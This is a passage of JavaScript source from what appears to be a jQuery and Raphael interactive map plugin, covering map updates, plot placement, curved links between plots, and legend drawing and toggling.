                    // Check existence of this value index
                    if (elemValue[valueIndex] === undefined) {
                        return true; // skip this iteration (each loop), goto next element
                    }
                    // Check if in range
                    if ((range.min !== undefined && elemValue[valueIndex] < range.min) ||
                        (range.max !== undefined && elemValue[valueIndex] > range.max)) {
                        // Element not in range
                        elemsFinalOpacity[id] = hiddenOpacity;
                    } else {
                        // Element in range
                        elemsFinalOpacity[id] = 1;
                    }
                });
            });
            // Now that we looped through all ranges, we can really assign the final opacity
            $.each(elemsFinalOpacity, function (id) {
                self.setElementOpacity(elems[id], elemsFinalOpacity[id], animDuration);
            });
        },

        /*
         * Set element opacity
         * Handle elem.mapElem and elem.textElem
         * @param elem the element
         * @param opacity the opacity to apply
         * @param animDuration the animation duration to use
         */
        setElementOpacity: function(elem, opacity, animDuration) {
            var self = this;

            // Ensure no animation is running
            //elem.mapElem.stop();
            //if (elem.textElem) elem.textElem.stop();

            // If final opacity is not null, ensure element is shown before proceeding
            if (opacity > 0) {
                elem.mapElem.show();
                if (elem.textElem) elem.textElem.show();
            }

            self.animate(elem.mapElem, {"opacity": opacity}, animDuration, function () {
                // If final attribute is 0, hide
                if (opacity === 0) elem.mapElem.hide();
            });

            self.animate(elem.textElem, {"opacity": opacity}, animDuration, function () {
                // If final attribute is 0, hide
                if (opacity === 0) elem.textElem.hide();
            });
        },

        /*
         * Update the current map
         *
         * Refresh attributes and tooltips for areas and plots
         * @param opt option for the refresh :
         *  opt.mapOptions: options to update for plots and areas
         *  opt.replaceOptions: whether mapsOptions should entirely replace current map options, or just extend it
         *  opt.opt.newPlots new plots to add to the map
         *  opt.newLinks new links to add to the map
         *  opt.deletePlotKeys plots to delete from the map (array, or "all" to remove all plots)
         *  opt.deleteLinkKeys links to remove from the map (array, or "all" to remove all links)
         *  opt.setLegendElemsState the state of legend elements to be set : show (default) or hide
         *  opt.animDuration animation duration in ms (default = 0)
         *  opt.afterUpdate hook that allows to add custom processing on the map
         */
        onUpdateEvent: function (e, opt) {
            var self = this;
            // Abort if opt is undefined
            if (typeof opt !== "object")  return;

            var i = 0;
            var animDuration = (opt.animDuration) ? opt.animDuration : 0;

            // This function remove an element using animation (or not, depending on animDuration)
            // Used for deletePlotKeys and deleteLinkKeys
            var fnRemoveElement = function (elem) {

                self.animate(elem.mapElem, {"opacity": 0}, animDuration, function () {
                    elem.mapElem.remove();
                });

                self.animate(elem.textElem, {"opacity": 0}, animDuration, function () {
                    elem.textElem.remove();
                });
            };

            // This function show an element using animation
            // Used for newPlots and newLinks
            var fnShowElement = function (elem) {
                // Starts with hidden elements
                elem.mapElem.attr({opacity: 0});
                if (elem.textElem) elem.textElem.attr({opacity: 0});
                // Set final element opacity
                self.setElementOpacity(
                    elem,
                    (elem.mapElem.originalAttrs.opacity !== undefined) ? elem.mapElem.originalAttrs.opacity : 1,
                    animDuration
                );
            };

            if (typeof opt.mapOptions === "object") {
                if (opt.replaceOptions === true) self.options = self.extendDefaultOptions(opt.mapOptions);
                else $.extend(true, self.options, opt.mapOptions);

                // IF we update areas, plots or legend, then reset all legend state to "show"
                if (opt.mapOptions.areas !== undefined || opt.mapOptions.plots !== undefined || opt.mapOptions.legend !== undefined) {
                    $("[data-type='legend-elem']", self.$container).each(function (id, elem) {
                        if ($(elem).attr('data-hidden') === "1") {
                            // Toggle state of element by clicking
                            $(elem).trigger("click", {hideOtherElems: false, animDuration: animDuration});
                        }
                    });
                }
            }

            // Delete plots by name if deletePlotKeys is array
            if (typeof opt.deletePlotKeys === "object") {
                for (; i < opt.deletePlotKeys.length; i++) {
                    if (self.plots[opt.deletePlotKeys[i]] !== undefined) {
                        fnRemoveElement(self.plots[opt.deletePlotKeys[i]]);
                        delete self.plots[opt.deletePlotKeys[i]];
                    }
                }
                // Delete ALL plots if deletePlotKeys is set to "all"
            } else if (opt.deletePlotKeys === "all") {
                $.each(self.plots, function (id, elem) {
                    fnRemoveElement(elem);
                });
                // Empty plots object
                self.plots = {};
            }

            // Delete links by name if deleteLinkKeys is array
            if (typeof opt.deleteLinkKeys === "object") {
                for (i = 0; i < opt.deleteLinkKeys.length; i++) {
                    if (self.links[opt.deleteLinkKeys[i]] !== undefined) {
                        fnRemoveElement(self.links[opt.deleteLinkKeys[i]]);
                        delete self.links[opt.deleteLinkKeys[i]];
                    }
                }
                // Delete ALL links if deleteLinkKeys is set to "all"
            } else if (opt.deleteLinkKeys === "all") {
                $.each(self.links, function (id, elem) {
                    fnRemoveElement(elem);
                });
                // Empty links object
                self.links = {};
            }

            // New plots
            if (typeof opt.newPlots === "object") {
                $.each(opt.newPlots, function (id) {
                    if (self.plots[id] === undefined) {
                        self.options.plots[id] = opt.newPlots[id];
                        self.plots[id] = self.drawPlot(id);
                        if (animDuration > 0) {
                            fnShowElement(self.plots[id]);
                        }
                    }
                });
            }

            // New links
            if (typeof opt.newLinks === "object") {
                var newLinks = self.drawLinksCollection(opt.newLinks);
                $.extend(self.links, newLinks);
                $.extend(self.options.links, opt.newLinks);
                if (animDuration > 0) {
                    $.each(newLinks, function (id) {
                        fnShowElement(newLinks[id]);
                    });
                }
            }

            // Update areas attributes and tooltips
            $.each(self.areas, function (id) {
                // Avoid updating unchanged elements
                if ((typeof opt.mapOptions === "object" &&
                    (
                        (typeof opt.mapOptions.map === "object" && typeof opt.mapOptions.map.defaultArea === "object") ||
                        (typeof opt.mapOptions.areas === "object" && typeof opt.mapOptions.areas[id] === "object") ||
                        (typeof opt.mapOptions.legend === "object" && typeof opt.mapOptions.legend.area === "object")
                    )) || opt.replaceOptions === true
                ) {
                    self.areas[id].options = self.getElemOptions(
                        self.options.map.defaultArea,
                        (self.options.areas[id] ? self.options.areas[id] : {}),
                        self.options.legend.area
                    );
                    self.updateElem(self.areas[id], animDuration);
                }
            });

            // Update plots attributes and tooltips
            $.each(self.plots, function (id) {
                // Avoid updating unchanged elements
                if ((typeof opt.mapOptions ==="object" &&
                    (
                        (typeof opt.mapOptions.map === "object" && typeof opt.mapOptions.map.defaultPlot === "object") ||
                        (typeof opt.mapOptions.plots === "object" && typeof opt.mapOptions.plots[id] === "object") ||
                        (typeof opt.mapOptions.legend === "object" && typeof opt.mapOptions.legend.plot === "object")
                    )) || opt.replaceOptions === true
                ) {
                    self.plots[id].options = self.getElemOptions(
                        self.options.map.defaultPlot,
                        (self.options.plots[id] ? self.options.plots[id] : {}),
                        self.options.legend.plot
                    );

                    self.setPlotCoords(self.plots[id]);
                    self.setPlotAttributes(self.plots[id]);

                    self.updateElem(self.plots[id], animDuration);
                }
            });

            // Update links attributes and tooltips
            $.each(self.links, function (id) {
                // Avoid updating unchanged elements
                if ((typeof opt.mapOptions === "object" &&
                    (
                        (typeof opt.mapOptions.map === "object" && typeof opt.mapOptions.map.defaultLink === "object") ||
                        (typeof opt.mapOptions.links === "object" && typeof opt.mapOptions.links[id] === "object")
                    )) || opt.replaceOptions === true
                ) {
                    self.links[id].options = self.getElemOptions(
                        self.options.map.defaultLink,
                        (self.options.links[id] ? self.options.links[id] : {}),
                        {}
                    );

                    self.updateElem(self.links[id], animDuration);
                }
            });

            // Update legends
            if (opt.mapOptions && (
                    (typeof opt.mapOptions.legend === "object") ||
                    (typeof opt.mapOptions.map === "object" && typeof opt.mapOptions.map.defaultArea === "object") ||
                    (typeof opt.mapOptions.map === "object" && typeof opt.mapOptions.map.defaultPlot === "object")
                )) {
                // Show all elements on the map before updating the legends
                $("[data-type='legend-elem']", self.$container).each(function (id, elem) {
                    if ($(elem).attr('data-hidden') === "1") {
                        $(elem).trigger("click", {hideOtherElems: false, animDuration: animDuration});
                    }
                });

                self.createLegends("area", self.areas, 1);
                if (self.options.map.width) {
                    self.createLegends("plot", self.plots, (self.options.map.width / self.mapConf.width));
                } else {
                    self.createLegends("plot", self.plots, (self.$map.width() / self.mapConf.width));
                }
            }

            // Hide/Show all elements based on showlegendElems
            //      Toggle (i.e. click) only if:
            //          - slice legend is shown AND we want to hide
            //          - slice legend is hidden AND we want to show
            if (typeof opt.setLegendElemsState === "object") {
                // setLegendElemsState is an object listing the legend we want to hide/show
                $.each(opt.setLegendElemsState, function (legendCSSClass, action) {
                    // Search for the legend
                    var $legend = self.$container.find("." + legendCSSClass)[0];
                    if ($legend !== undefined) {
                        // Select all elem inside this legend
                        $("[data-type='legend-elem']", $legend).each(function (id, elem) {
                            if (($(elem).attr('data-hidden') === "0" && action === "hide") ||
                                ($(elem).attr('data-hidden') === "1" && action === "show")) {
                                // Toggle state of element by clicking
                                $(elem).trigger("click", {hideOtherElems: false, animDuration: animDuration});
                            }
                        });
                    }
                });
            } else {
                // setLegendElemsState is a string, or is undefined
                // Default : "show"
                var action = (opt.setLegendElemsState === "hide") ? "hide" : "show";

                $("[data-type='legend-elem']", self.$container).each(function (id, elem) {
                    if (($(elem).attr('data-hidden') === "0" && action === "hide") ||
                        ($(elem).attr('data-hidden') === "1" && action === "show")) {
                        // Toggle state of element by clicking
                        $(elem).trigger("click", {hideOtherElems: false, animDuration: animDuration});
                    }
                });
            }

            // Always rebind custom events on update
            self.initDelegatedCustomEvents();

            if (opt.afterUpdate) opt.afterUpdate(self.$container, self.paper, self.areas, self.plots, self.options, self.links);
        },

        /*
         * Set plot coordinates
         * @param plot object plot element
         */
        setPlotCoords: function(plot) {
            var self = this;

            if (plot.options.x !== undefined && plot.options.y !== undefined) {
                plot.coords = {
                    x: plot.options.x,
                    y: plot.options.y
                };
            } else if (plot.options.plotsOn !== undefined && self.areas[plot.options.plotsOn] !== undefined) {
                var areaBBox = self.areas[plot.options.plotsOn].mapElem.getBBox();
                plot.coords = {
                    x: areaBBox.cx,
                    y: areaBBox.cy
                };
            } else {
                plot.coords = self.mapConf.getCoords(plot.options.latitude, plot.options.longitude);
            }
        },

        /*
         * Set plot size attributes according to its type
         * Note: for SVG, plot.mapElem needs to exists beforehand
         * @param plot object plot element
         */
        setPlotAttributes: function(plot) {
            if (plot.options.type === "square") {
                plot.options.attrs.width = plot.options.size;
                plot.options.attrs.height = plot.options.size;
                plot.options.attrs.x = plot.coords.x - (plot.options.size / 2);
                plot.options.attrs.y = plot.coords.y - (plot.options.size / 2);
            } else if (plot.options.type === "image") {
                plot.options.attrs.src = plot.options.url;
                plot.options.attrs.width = plot.options.width;
                plot.options.attrs.height = plot.options.height;
                plot.options.attrs.x = plot.coords.x - (plot.options.width / 2);
                plot.options.attrs.y = plot.coords.y - (plot.options.height / 2);
            } else if (plot.options.type === "svg") {
                plot.options.attrs.path = plot.options.path;

                // Init transform string
                if (plot.options.attrs.transform === undefined) {
                    plot.options.attrs.transform = "";
                }

                // Retrieve original boundary box if not defined
                if (plot.mapElem.originalBBox === undefined) {
                    plot.mapElem.originalBBox = plot.mapElem.getBBox();
                }

                // The base transform will resize the SVG path to the one specified by width/height
                // and also move the path to the actual coordinates
                plot.mapElem.baseTransform = "m" + (plot.options.width / plot.mapElem.originalBBox.width) + ",0,0," +
                                                   (plot.options.height / plot.mapElem.originalBBox.height) + "," +
                                                   (plot.coords.x - plot.options.width / 2) + "," +
                                                   (plot.coords.y - plot.options.height / 2);

                plot.options.attrs.transform = plot.mapElem.baseTransform + plot.options.attrs.transform;

            } else { // Default : circle
                plot.options.attrs.x = plot.coords.x;
                plot.options.attrs.y = plot.coords.y;
                plot.options.attrs.r = plot.options.size / 2;
            }
        },

        /*
         * Draw all links between plots on the paper
         */
        drawLinksCollection: function (linksCollection) {
            var self = this;
            var p1 = {};
            var p2 = {};
            var coordsP1 = {};
            var coordsP2 = {};
            var links = {};

            $.each(linksCollection, function (id) {
                var elemOptions = self.getElemOptions(self.options.map.defaultLink, linksCollection[id], {});

                if (typeof linksCollection[id].between[0] === 'string') {
                    p1 = self.options.plots[linksCollection[id].between[0]];
                } else {
                    p1 = linksCollection[id].between[0];
                }

                if (typeof linksCollection[id].between[1] === 'string') {
                    p2 = self.options.plots[linksCollection[id].between[1]];
                } else {
                    p2 = linksCollection[id].between[1];
                }

                if (p1.plotsOn !== undefined && self.areas[p1.plotsOn] !== undefined) {
                    var p1BBox = self.areas[p1.plotsOn].mapElem.getBBox();
                    coordsP1 = {
                        x: p1BBox.cx,
                        y: p1BBox.cy
                    };
                }
                else if (p1.latitude !== undefined && p1.longitude !== undefined) {
                    coordsP1 = self.mapConf.getCoords(p1.latitude, p1.longitude);
                } else {
                    coordsP1.x = p1.x;
                    coordsP1.y = p1.y;
                }

                if (p2.plotsOn !== undefined && self.areas[p2.plotsOn] !== undefined) {
                    var p2BBox = self.areas[p2.plotsOn].mapElem.getBBox();
                    coordsP2 = {
                        x: p2BBox.cx,
                        y: p2BBox.cy
                    };
                }
                else if (p2.latitude !== undefined && p2.longitude !== undefined) {
                    coordsP2 = self.mapConf.getCoords(p2.latitude, p2.longitude);
                } else {
                    coordsP2.x = p2.x;
                    coordsP2.y = p2.y;
                }
                links[id] = self.drawLink(id, coordsP1.x, coordsP1.y, coordsP2.x, coordsP2.y, elemOptions);
            });
            return links;
        },

        /*
         * Draw a curved link between two couples of coordinates a(xa,ya) and b(xb, yb) on the paper
         */
        drawLink: function (id, xa, ya, xb, yb, elemOptions) {
            var self = this;
            var link = {
                options: elemOptions
            };
            // Compute the "curveto" SVG point, d(x,y)
            // c(xc, yc) is the center of (xa,ya) and (xb, yb)
            var xc = (xa + xb) / 2;
            var yc = (ya + yb) / 2;

            // Equation for (cd) : y = acd * x + bcd (d is the cure point)
            var acd = -1 / ((yb - ya) / (xb - xa));
            var bcd = yc - acd * xc;

            // dist(c,d) = dist(a,b) (=abDist)
            var abDist = Math.sqrt((xb - xa) * (xb - xa) + (yb - ya) * (yb - ya));

            // Solution for equation dist(cd) = sqrt((xd - xc)² + (yd - yc)²)
            // dist(c,d)² = (xd - xc)² + (yd - yc)²
            // We assume that dist(c,d) = dist(a,b)
            // so : (xd - xc)² + (yd - yc)² - dist(a,b)² = 0
            // With the factor : (xd - xc)² + (yd - yc)² - (factor*dist(a,b))² = 0
            // (xd - xc)² + (acd*xd + bcd - yc)² - (factor*dist(a,b))² = 0
            var a = 1 + acd * acd;
            var b = -2 * xc + 2 * acd * bcd - 2 * acd * yc;
            var c = xc * xc + bcd * bcd - bcd * yc - yc * bcd + yc * yc - ((elemOptions.factor * abDist) * (elemOptions.factor * abDist));
            var delta = b * b - 4 * a * c;
            var x = 0;
            var y = 0;

            // There are two solutions, we choose one or the other depending on the sign of the factor
            if (elemOptions.factor > 0) {
                x = (-b + Math.sqrt(delta)) / (2 * a);
                y = acd * x + bcd;
            } else {
                x = (-b - Math.sqrt(delta)) / (2 * a);
                y = acd * x + bcd;
            }

            link.mapElem = self.paper.path("m " + xa + "," + ya + " C " + x + "," + y + " " + xb + "," + yb + " " + xb + "," + yb + "");

            self.initElem(id, 'link', link);

            return link;
        },

        /*
         * Check wether newAttrs object bring modifications to originalAttrs object
         */
        isAttrsChanged: function(originalAttrs, newAttrs) {
            for (var key in newAttrs) {
                if (newAttrs.hasOwnProperty(key) && typeof originalAttrs[key] === 'undefined' || newAttrs[key] !== originalAttrs[key]) {
                    return true;
                }
            }
            return false;
        },

        /*
         * Update the element "elem" on the map with the new options
         */
        updateElem: function (elem, animDuration) {
            var self = this;
            var mapElemBBox;
            var plotOffsetX;
            var plotOffsetY;

            if (elem.options.toFront === true) {
                elem.mapElem.toFront();
            }

            // Set the cursor attribute related to the HTML link
            if (elem.options.href !== undefined) {
                elem.options.attrs.cursor = "pointer";
                if (elem.options.text) elem.options.text.attrs.cursor = "pointer";
            } else {
                // No HTML links, check if a cursor was defined to pointer
                if (elem.mapElem.attrs.cursor === 'pointer') {
                    elem.options.attrs.cursor = "auto";
                    if (elem.options.text) elem.options.text.attrs.cursor = "auto";
                }
            }

            // Update the label
            if (elem.textElem) {
                // Update text attr
                elem.options.text.attrs.text = elem.options.text.content;

                // Get mapElem size, and apply an offset to handle future width/height change
                mapElemBBox = elem.mapElem.getBBox();
                if (elem.options.size || (elem.options.width && elem.options.height)) {
                    if (elem.options.type === "image" || elem.options.type === "svg") {
                        plotOffsetX = (elem.options.width - mapElemBBox.width) / 2;
                        plotOffsetY = (elem.options.height - mapElemBBox.height) / 2;
                    } else {
                        plotOffsetX = (elem.options.size - mapElemBBox.width) / 2;
                        plotOffsetY = (elem.options.size - mapElemBBox.height) / 2;
                    }
                    mapElemBBox.x -= plotOffsetX;
                    mapElemBBox.x2 += plotOffsetX;
                    mapElemBBox.y -= plotOffsetY;
                    mapElemBBox.y2 += plotOffsetY;
                }

                // Update position attr
                var textPosition = self.getTextPosition(mapElemBBox, elem.options.text.position, elem.options.text.margin);
                elem.options.text.attrs.x = textPosition.x;
                elem.options.text.attrs.y = textPosition.y;
                elem.options.text.attrs['text-anchor'] = textPosition.textAnchor;

                // Update text element attrs and attrsHover
                self.setHoverOptions(elem.textElem, elem.options.text.attrs, elem.options.text.attrsHover);

                if (self.isAttrsChanged(elem.textElem.attrs, elem.options.text.attrs)) {
                    self.animate(elem.textElem, elem.options.text.attrs, animDuration);
                }
            }

            // Update elements attrs and attrsHover
            self.setHoverOptions(elem.mapElem, elem.options.attrs, elem.options.attrsHover);

            if (self.isAttrsChanged(elem.mapElem.attrs, elem.options.attrs)) {
                self.animate(elem.mapElem, elem.options.attrs, animDuration);
            }

            // Update the cssClass
            if (elem.options.cssClass !== undefined) {
                $(elem.mapElem.node).removeClass().addClass(elem.options.cssClass);
            }
        },

        /*
         * Draw the plot
         */
        drawPlot: function (id) {
            var self = this;
            var plot = {};

            // Get plot options and store it
            plot.options = self.getElemOptions(
                self.options.map.defaultPlot,
                (self.options.plots[id] ? self.options.plots[id] : {}),
                self.options.legend.plot
            );

            // Set plot coords
            self.setPlotCoords(plot);

            // Draw SVG before setPlotAttributes()
            if (plot.options.type === "svg") {
                plot.mapElem = self.paper.path(plot.options.path);
            }

            // Set plot size attrs
            self.setPlotAttributes(plot);

            // Draw other types of plots
            if (plot.options.type === "square") {
                plot.mapElem = self.paper.rect(
                    plot.options.attrs.x,
                    plot.options.attrs.y,
                    plot.options.attrs.width,
                    plot.options.attrs.height
                );
            } else if (plot.options.type === "image") {
                plot.mapElem = self.paper.image(
                    plot.options.attrs.src,
                    plot.options.attrs.x,
                    plot.options.attrs.y,
                    plot.options.attrs.width,
                    plot.options.attrs.height
                );
            } else if (plot.options.type === "svg") {
                // Nothing to do
            } else {
                // Default = circle
                plot.mapElem = self.paper.circle(
                    plot.options.attrs.x,
                    plot.options.attrs.y,
                    plot.options.attrs.r
                );
            }

            self.initElem(id, 'plot', plot);

            return plot;
        },

        /*
         * Set user defined handlers for events on areas and plots
         * @param id the id of the element
         * @param type the type of the element (area, plot, link)
         * @param elem the element object {mapElem, textElem, options, ...}
         */
        setEventHandlers: function (id, type, elem) {
            var self = this;
            $.each(elem.options.eventHandlers, function (event) {
                if (self.customEventHandlers[event] === undefined) self.customEventHandlers[event] = {};
                if (self.customEventHandlers[event][type] === undefined) self.customEventHandlers[event][type] = {};
                self.customEventHandlers[event][type][id] = elem;
            });
        },

        /*
         * Draw a legend for areas and / or plots
         * @param legendOptions options for the legend to draw
         * @param legendType the type of the legend : "area" or "plot"
         * @param elems collection of plots or areas on the maps
         * @param legendIndex index of the legend in the conf array
         */
        drawLegend: function (legendOptions, legendType, elems, scale, legendIndex) {
            var self = this;
            var $legend = {};
            var legendPaper = {};
            var width = 0;
            var height = 0;
            var title = null;
            var titleBBox = null;
            var legendElems = {};
            var i = 0;
            var x = 0;
            var y = 0;
            var yCenter = 0;
            var sliceOptions = [];

            $legend = $("." + legendOptions.cssClass, self.$container);

            // Save content for later
            var initialHTMLContent = $legend.html();
            $legend.empty();

            legendPaper = new Raphael($legend.get(0));
            // Set some data to object
            $(legendPaper.canvas).attr({"data-legend-type": legendType, "data-legend-id": legendIndex});

            height = width = 0;

            // Set the title of the legend
            if (legendOptions.title && legendOptions.title !== "") {
                title = legendPaper.text(legendOptions.marginLeftTitle, 0, legendOptions.title).attr(legendOptions.titleAttrs);
                titleBBox = title.getBBox();
                title.attr({y: 0.5 * titleBBox.height});

                width = legendOptions.marginLeftTitle + titleBBox.width;
                height += legendOptions.marginBottomTitle + titleBBox.height;
            }

            // Calculate attrs (and width, height and r (radius)) for legend elements, and yCenter for horizontal legends

            for (i = 0; i < legendOptions.slices.length; ++i) {
                var yCenterCurrent = 0;

                sliceOptions[i] = $.extend(true, {}, (legendType === "plot") ? self.options.map.defaultPlot : self.options.map.defaultArea, legendOptions.slices[i]);

                if (legendOptions.slices[i].legendSpecificAttrs === undefined) {
                    legendOptions.slices[i].legendSpecificAttrs = {};
                }

                $.extend(true, sliceOptions[i].attrs, legendOptions.slices[i].legendSpecificAttrs);

                if (legendType === "area") {
                    if (sliceOptions[i].attrs.width === undefined)
                        sliceOptions[i].attrs.width = 30;
                    if (sliceOptions[i].attrs.height === undefined)
                        sliceOptions[i].attrs.height = 20;
                } else if (sliceOptions[i].type === "square") {
                    if (sliceOptions[i].attrs.width === undefined)
                        sliceOptions[i].attrs.width = sliceOptions[i].size;
                    if (sliceOptions[i].attrs.height === undefined)
                        sliceOptions[i].attrs.height = sliceOptions[i].size;
                } else if (sliceOptions[i].type === "image" || sliceOptions[i].type === "svg") {
                    if (sliceOptions[i].attrs.width === undefined)
                        sliceOptions[i].attrs.width = sliceOptions[i].width;
                    if (sliceOptions[i].attrs.height === undefined)
                        sliceOptions[i].attrs.height = sliceOptions[i].height;
                } else {
                    if (sliceOptions[i].attrs.r === undefined)
                        sliceOptions[i].attrs.r = sliceOptions[i].size / 2;
                }

                // Compute yCenter for this legend slice
                yCenterCurrent = legendOptions.marginBottomTitle;
                // Add title height if it exists
                if (title) {
                    yCenterCurrent += titleBBox.height;
                }
                if (legendType === "plot" && (sliceOptions[i].type === undefined || sliceOptions[i].type === "circle")) {
                    yCenterCurrent += scale * sliceOptions[i].attrs.r;
                } else {
                    yCenterCurrent += scale * sliceOptions[i].attrs.height / 2;
                }
                // Update yCenter if current larger
                yCenter = Math.max(yCenter, yCenterCurrent);
            }

            if (legendOptions.mode === "horizontal") {
                width = legendOptions.marginLeft;
            }

            // Draw legend elements (circle, square or image in vertical or horizontal mode)
            for (i = 0; i < sliceOptions.length; ++i) {
                var legendElem = {};
                var legendElemBBox = {};
                var legendLabel = {};

                if (sliceOptions[i].display === undefined || sliceOptions[i].display === true) {
                    if (legendType === "area") {
                        if (legendOptions.mode === "horizontal") {
                            x = width + legendOptions.marginLeft;
                            y = yCenter - (0.5 * scale * sliceOptions[i].attrs.height);
                        } else {
                            x = legendOptions.marginLeft;
                            y = height;
                        }

                        legendElem = legendPaper.rect(x, y, scale * (sliceOptions[i].attrs.width), scale * (sliceOptions[i].attrs.height));
                    } else if (sliceOptions[i].type === "square") {
                        if (legendOptions.mode === "horizontal") {
                            x = width + legendOptions.marginLeft;
                            y = yCenter - (0.5 * scale * sliceOptions[i].attrs.height);
                        } else {
                            x = legendOptions.marginLeft;
                            y = height;
                        }

                        legendElem = legendPaper.rect(x, y, scale * (sliceOptions[i].attrs.width), scale * (sliceOptions[i].attrs.height));

                    } else if (sliceOptions[i].type === "image" || sliceOptions[i].type === "svg") {
                        if (legendOptions.mode === "horizontal") {
                            x = width + legendOptions.marginLeft;
                            y = yCenter - (0.5 * scale * sliceOptions[i].attrs.height);
                        } else {
                            x = legendOptions.marginLeft;
                            y = height;
                        }

                        if (sliceOptions[i].type === "image") {
                            legendElem = legendPaper.image(
                                sliceOptions[i].url, x, y, scale * sliceOptions[i].attrs.width, scale * sliceOptions[i].attrs.height);
                        } else {
                            legendElem = legendPaper.path(sliceOptions[i].path);

                            if (sliceOptions[i].attrs.transform === undefined) {
                                sliceOptions[i].attrs.transform = "";
                            }
                            legendElemBBox = legendElem.getBBox();
                            sliceOptions[i].attrs.transform = "m" + ((scale * sliceOptions[i].width) / legendElemBBox.width) + ",0,0," + ((scale * sliceOptions[i].height) / legendElemBBox.height) + "," + x + "," + y + sliceOptions[i].attrs.transform;
                        }
                    } else {
                        if (legendOptions.mode === "horizontal") {
                            x = width + legendOptions.marginLeft + scale * (sliceOptions[i].attrs.r);
                            y = yCenter;
                        } else {
                            x = legendOptions.marginLeft + scale * (sliceOptions[i].attrs.r);
                            y = height + scale * (sliceOptions[i].attrs.r);
                        }
                        legendElem = legendPaper.circle(x, y, scale * (sliceOptions[i].attrs.r));
                    }

                    // Set attrs to the element drawn above
                    delete sliceOptions[i].attrs.width;
                    delete sliceOptions[i].attrs.height;
                    delete sliceOptions[i].attrs.r;
                    legendElem.attr(sliceOptions[i].attrs);
                    legendElemBBox = legendElem.getBBox();

                    // Draw the label associated with the element
                    if (legendOptions.mode === "horizontal") {
                        x = width + legendOptions.marginLeft + legendElemBBox.width + legendOptions.marginLeftLabel;
                        y = yCenter;
                    } else {
                        x = legendOptions.marginLeft + legendElemBBox.width + legendOptions.marginLeftLabel;
                        y = height + (legendElemBBox.height / 2);
                    }

                    legendLabel = legendPaper.text(x, y, sliceOptions[i].label).attr(legendOptions.labelAttrs);

                    // Update the width and height for the paper
                    if (legendOptions.mode === "horizontal") {
                        var currentHeight = legendOptions.marginBottom + legendElemBBox.height;
                        width += legendOptions.marginLeft + legendElemBBox.width + legendOptions.marginLeftLabel + legendLabel.getBBox().width;
                        if (sliceOptions[i].type !== "image" && legendType !== "area") {
                            currentHeight += legendOptions.marginBottomTitle;
                        }
                        // Add title height if it exists
                        if (title) {
                            currentHeight += titleBBox.height;
                        }
                        height = Math.max(height, currentHeight);
                    } else {
                        width = Math.max(width, legendOptions.marginLeft + legendElemBBox.width + legendOptions.marginLeftLabel + legendLabel.getBBox().width);
                        height += legendOptions.marginBottom + legendElemBBox.height;
                    }

                    // Set some data to elements
                    $(legendElem.node).attr({
                        "data-legend-id": legendIndex,
                        "data-legend-type": legendType,
                        "data-type": "legend-elem",
                        "data-id": i,
                        "data-hidden": 0
                    });
                    $(legendLabel.node).attr({
                        "data-legend-id": legendIndex,
                        "data-legend-type": legendType,
                        "data-type": "legend-label",
                        "data-id": i,
                        "data-hidden": 0
                    });

                    // Set array content
                    // We use similar names like map/plots/links
                    legendElems[i] = {
                        mapElem: legendElem,
                        textElem: legendLabel
                    };

                    // Hide map elements when the user clicks on a legend item
                    if (legendOptions.hideElemsOnClick.enabled) {
                        // Hide/show elements when user clicks on a legend element
                        legendLabel.attr({cursor: "pointer"});
                        legendElem.attr({cursor: "pointer"});

                        self.setHoverOptions(legendElem, sliceOptions[i].attrs, sliceOptions[i].attrs);
                        self.setHoverOptions(legendLabel, legendOptions.labelAttrs, legendOptions.labelAttrsHover);

                        if (sliceOptions[i].clicked !== undefined && sliceOptions[i].clicked === true) {
                            self.handleClickOnLegendElem(legendElems[i], i, legendIndex, legendType, {hideOtherElems: false});
                        }
                    }
                }
            }

            // VMLWidth option allows you to set static width for the legend
            // only for VML render because text.getBBox() returns wrong values on IE6/7
            if (Raphael.type !== "SVG" && legendOptions.VMLWidth)
                width = legendOptions.VMLWidth;

            legendPaper.setSize(width, height);

            return {
                container: $legend,
                initialHTMLContent: initialHTMLContent,
                elems: legendElems
            };
        },

        /*
         * Allow to hide elements of the map when the user clicks on a related legend item
         * @param elem legend element
         * @param id legend element ID
         * @param legendIndex corresponding legend index
         * @param legendType corresponding legend type (area or plot)
         * @param opts object additionnal options
         *          hideOtherElems boolean, if other elems shall be hidden
         *          animDuration duration of animation
         */
        handleClickOnLegendElem: function(elem, id, legendIndex, legendType, opts) {
            var self = this;
            var legendOptions;
            opts = opts || {};

            if (!$.isArray(self.options.legend[legendType])) {
                legendOptions = self.options.legend[legendType];
            } else {
                legendOptions = self.options.legend[legendType][legendIndex];
            }

            var legendElem = elem.mapElem;
            var legendLabel = elem.textElem;
            var $legendElem = $(legendElem.node);
            var $legendLabel = $(legendLabel.node);
            var sliceOptions = legendOptions.slices[id];
            var mapElems = legendType === 'area' ? self.areas : self.plots;
            // Check animDuration: if not set, this is a regular click, use the value specified in options
            var animDuration = opts.animDuration !== undefined ? opts.animDuration : legendOptions.hideElemsOnClick.animDuration ;

            var hidden = $legendElem.attr('data-hidden');
            var hiddenNewAttr = (hidden === '0') ? {"data-hidden": '1'} : {"data-hidden": '0'};

            if (hidden === '0') {
                self.animate(legendLabel, {"opacity": 0.5}, animDuration);
            } else {
                self.animate(legendLabel, {"opacity": 1}, animDuration);
            }

            $.each(mapElems, function (y) {
                var elemValue;

                // Retreive stored data of element
                //      'hidden-by' contains the list of legendIndex that is hiding this element
                var hiddenBy = mapElems[y].mapElem.data('hidden-by');
                // Set to empty object if undefined
                if (hiddenBy === undefined) hiddenBy = {};

                if ($.isArray(mapElems[y].options.value)) {
                    elemValue = mapElems[y].options.value[legendIndex];
                } else {
                    elemValue = mapElems[y].options.value;
                }

                // Hide elements whose value matches with the slice of the clicked legend item
                if (self.getLegendSlice(elemValue, legendOptions) === sliceOptions) {
                    if (hidden === '0') { // we want to hide this element
                        hiddenBy[legendIndex] = true; // add legendIndex to the data object for later use
                        self.setElementOpacity(mapElems[y], legendOptions.hideElemsOnClick.opacity, animDuration);
                    } else { // We want to show this element
                        delete hiddenBy[legendIndex]; // Remove this legendIndex from object
                        // Check if another legendIndex is defined
                        // We will show this element only if no legend is no longer hiding it
                        if ($.isEmptyObject(hiddenBy)) {
                            self.setElementOpacity(
                                mapElems[y],
                                mapElems[y].mapElem.originalAttrs.opacity !== undefined ? mapElems[y].mapElem.originalAttrs.opacity : 1,
                                animDuration
                            );
                        }
                    }
                    // Update elem data with new values
                    mapElems[y].mapElem.data('hidden-by', hiddenBy);
                }
            });

            $legendElem.attr(hiddenNewAttr);
            $legendLabel.attr(hiddenNewAttr);

            if ((opts.hideOtherElems === undefined || opts.hideOtherElems === true) && legendOptions.exclusive === true ) {
